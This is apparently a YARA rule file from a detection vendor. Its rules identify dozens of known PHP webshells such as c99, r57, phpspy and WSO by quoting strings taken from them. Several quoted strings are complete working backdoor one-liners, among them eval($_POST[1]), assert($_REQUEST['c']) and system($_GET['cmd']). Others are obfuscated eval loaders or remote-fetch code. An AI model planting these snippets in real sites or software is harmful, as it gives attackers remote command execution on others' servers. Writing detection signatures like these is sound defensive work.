        description = "antichat shell v1.3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000144
{
    meta:
        description = "safe mode breaker.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
        $s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000145
{
    meta:
        description = "sst-sheller.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
        $s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000146
{
    meta:
        description = "phpjackal v1.5.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
        $s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000147
{
    meta:
        description = "s72 shell v1.1 coding.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000148
{
    meta:
        description = "ghost.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
        $s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
        $s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\""
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000149
{
    meta:
        description = "winx shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
        $s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000150
{
    meta:
        description = "crystal.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
        $s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000151
{
    meta:
        description = "r57.1.4.0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "@ini_set('error_log',NULL);"
        $s6 = "$pass='abcdef1234567890abcdef1234567890';"
        $s7 = "@ini_restore(\"disable_functions\");"
        $s9 = "@ini_restore(\"safe_mode_exec_dir\");"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000152
{
    meta:
        description = "cmd.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "if($_GET['cmd']) {"
        $s1 = "// cmd.php = Command Execution"
        $s7 = "  system($_GET['cmd']);"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000153
{
    meta:
        description = "co.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV"
        $s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000154
{
    meta:
        description = "150.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "HJ3HjqxclkZfp"
        $s1 = "<? eval(gzinflate(base64_decode('"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000155
{
    meta:
        description = "c37.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
        $s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000156
{
    meta:
        description = "b37.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000157
{
    meta:
        description = "php-backdoor.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $a0 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))"
        $a1 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
        $s0 = "http://michaeldaw.org   2006"
        $s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
        $s2 = "coded by z0mbie"
        $s3 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix"
        $s4 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
        $s5 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');"
        $s6 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000158
{
    meta:
        description = "2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<?php assert($_REQUEST[\"c\"]);?> "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000159
{
    meta:
        description = "c99 madnet smowu.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "//Authentication"
        $s1 = "$login = \""
        $s2 = "eval(gzinflate(base64_decode('"
        $s4 = "//Pass"
        $s5 = "$md5_pass = \""
        $s6 = "//If no pass then hash"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000160
{
    meta:
        description = "moon.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = "echo '<option value=\"create function backshell returns string soname"
        $s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
        $s8 = "echo '<option value=\"select cmdshell(\\'net user "
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000161
{
    meta:
        description = "bug (1).php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "@include($_GET['bug']);"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000162
{
    meta:
        description = "metaslsoft.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000163
{
    meta:
        description = "itsec.php, itsecteam_shell.php, jhn.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
        $s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000164
{
    meta:
        description = "ghost_source.php, icesword.php, silic.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
        $s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000165
{
    meta:
        description = "wso2.5.1.php, wso2.5.php, wso2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
        $s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000166
{
    meta:
        description = "r57shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
        $s1 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
        $s2 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
        
        $a0 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
        $a1 = "RusH security team"
        $a2 = "'ru_text12' => 'back-connect"
        
    condition:
        all of ($s*) or 2 of ($a*)
}
rule Backdoor_Webshell_PHP_000167
{
    meta:
        description = "shell.php, phpspy_2006.php, arabicspy.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
        $s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000168
{
    meta:
        description = "phpspy_2005_full.php, phpspy_2005_lite.php, phpspy.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
        $s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
        $s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000169
{
    meta:
        description = "shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000170
{
    meta:
        description = "c99shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000171
{
    meta:
        description = "File Manager 2008.php, 2009lite.php, 2009mssql.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
        $s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000172
{
    meta:
        description = "phpspy_hkrkoz.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "$mainpath_info           = explode('/', $mainpath);"
        $s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000173
{
    meta:
        description = "diveshell_1_0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
        $s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000174
{
    meta:
        description = "phpspy2005full.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";"
        $s1 = "while(list($kname, $columns) = @each($index)) {"
        $s2 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";"
        $s3 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";"
        
        $a0 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"
        
        $fn = "filename: backup"
        
    condition:
        (2 of ($s*) and not $fn) or ( all of ($a*) )
}
rule Backdoor_Webshell_PHP_000175
{
    meta:
        description = "r57shell127.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
        $s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000176
{
    meta:
        description = "itsec.php, phpjackal.php, itsecteam_shell.php, jhn.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");"
        $s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
        $s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000177
{
    meta:
        description = "nix remote web shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
        $s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];"
        $s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}"
        $s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000178
{
    meta:
        description = "c99_w4cking_shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "echo \"<b>HEXDUMP:</b><nobr>"
        $s4 = "if ($filestealth) {$stat = stat($d.$f);}"
        $s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
        $s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
        $s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";"
        $s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000179
{
    meta:
        description = "phpspy2006_arabicspy.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "$this -> addFile($content, $filename);"
        $s3 = "function addFile($data, $name, $time = 0) {"
        $s8 = "function unix2DosTime($unixtime = 0) {"
        $s9 = "foreach($filelist as $filename){"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000180
{
    meta:
        description = "c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
        $s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\"),"
        $s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
        $s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
        $s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
        $s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000181
{
    meta:
        description = "c99.php, c99shell.php, c99.php, c99shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s2 = "$bindport_pass = \"c99\";"
        $s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000182
{
    meta:
        description = "r57shell127.php, r57_ifx.php, r57_kartal.php, r57.php, antichat.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
        $s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";"
        $s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }"
        $s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000183
{
    meta:
        description = "nstview_xxx.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s3 = "BODY, TD, TR {"
        $s5 = "$d=str_replace(\"\\\\\",\"/\",$d);"
        $s6 = "if ($file==\".\" || $file==\"..\") continue;"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000184
{
    meta:
        description = "phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, phpspy.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s4 = "http://www.4ngel.net"
        $s5 = "</a> | <a href=\"?action=phpenv\">PHP"
        $s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \""
        $s9 = "Codz by Angel"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000185
{
    meta:
        description = "r57shell127.php, r57_kartal.php, r57.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");"
        $s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }"
        $s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000186
{
    meta:
        description = "make2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000187
{
    meta:
        description = "file php2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000188
{
    meta:
        description = "404super.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);"
        $s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),"
        $s7 = "//http://require.duapp.com/session.php"
        $s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}"
        $s12 = "//define('pass','123456');"
        $s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000189
{
    meta:
        description = "webshell-123.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "// Web Shell!!"
        $s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
        $s3 = "$default_charset = \"UTF-8\";"
        $s4 = "// url:http://www.weigongkai.com/shell/"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000190
{
    meta:
        description = "dev_core.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {"
        $s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);"
        $s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
        $s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
        $s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
        $s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000191
{
    meta:
        description = "php.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);"
        $s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
        $s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
        $s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
        $s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000192
{
    meta:
        description = "pppp.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "Mail: chinese@hackermail.com"
        $s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
        $s6 = "Site: http://blog.weili.me"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000193
{
    meta:
        description = "code.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
        $s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
        $s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
        $s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
        $s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000194
{
    meta:
        description = "xxxx.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<?php eval($_POST[1]);?>  "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000195
{
    meta:
        description = "php1.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>"
        $s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316"
        $s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); "
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000196
{
    meta:
        description = "php6.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "array_map(\"asx73ert\",(ar"
        $s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");"
        $s4 = "shell.php?qid=zxexp  "
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000197
{
    meta:
        description = "xxx.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000198
{
    meta:
        description = "getpostphp.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000199
{
    meta:
        description = "php5.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000200
{
    meta:
        description = "php.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "echo \"<font color=blue>Error!</font>\";"
        $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
        $s5 = " - ExpDoor.com</title>"
        $s10 = "$f=fopen($_POST[\"f\"],\"w\");"
        $s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000201
{
    meta:
        description = "semi-auto-generated liz0zim private safe mode command execuriton bypass exploit.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
        $s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
        $s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000202
{
    meta:
        description = "semi-auto-generated nshell (1).php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
        $s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000203
{
    meta:
        description = "semi-auto-generated shankar.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $sAuthor = "ShAnKaR"
        $s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
        $s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
        
    condition:
        1 of ($s*) and $sAuthor
}
rule Backdoor_Webshell_PHP_000204
{
    meta:
        description = "semi-auto-generated casus15.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
        $s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
        $s3 = "value='Calistirmak istediginiz "
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000205
{
    meta:
        description = "semi-auto-generated small.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "$pass='abcdef1234567890abcdef1234567890';"
        $s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
        $s4 = "@ini_set('error_log',NULL);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000206
{
    meta:
        description = "semi-auto-generated fuckphpshell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$succ = \"Warning! "
        $s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
